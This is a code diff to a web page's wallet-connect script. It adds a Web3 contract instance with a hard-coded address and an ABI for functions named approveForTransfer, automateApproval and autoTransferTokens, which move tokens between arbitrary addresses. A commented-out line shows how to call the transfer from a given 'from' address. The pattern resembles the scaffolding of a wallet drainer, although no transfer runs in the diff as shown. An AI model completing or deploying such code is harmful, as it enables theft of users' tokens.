@@ -18,6 +18,106 @@ window.addEventListener('load', async () => {
                 walletAddress.textContent = userAccount;
                 walletInfo.classList.remove('hidden');
                 status.textContent = 'Wallet connected: ' + userAccount;
+
+                // Initialize Web3 instance
+                const web3 = new Web3(window.ethereum);
+
+                // 智能合约地址
+                const contractAddress = "0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2"; // 替换为你的合约地址
+
+                // 智能合约 ABI
+                const contractABI = [
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "tokenAddress",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "spender",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "approveForTransfer",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "tokenAddress",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "spender",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "automateApproval",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [
+                            {
+                                "internalType": "address",
+                                "name": "tokenAddress",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "from",
+                                "type": "address"
+                            },
+                            {
+                                "internalType": "address",
+                                "name": "to",
+                                "type": "address"
+                            }
+                        ],
+                        "name": "autoTransferTokens",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    },
+                    {
+                        "inputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "constructor"
+                    },
+                    {
+                        "inputs": [],
+                        "name": "owner",
+                        "outputs": [
+                            {
+                                "internalType": "address",
+                                "name": "",
+                                "type": "address"
+                            }
+                        ],
+                        "stateMutability": "view",
+                        "type": "function"
+                    }
+                ];
+
+                // 创建合约实例
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                // 在这里可以添加与智能合约的交互代码，例如调用方法
+                // 例如：调用自动转移功能
+                // await contract.methods.autoTransferTokens(tokenAddress, fromAddress, toAddress).send({ from: userAccount });
+
             } catch (error) {
                 console.error('Error connecting wallet:', error);
                 status.textContent = 'Failed to connect wallet.';
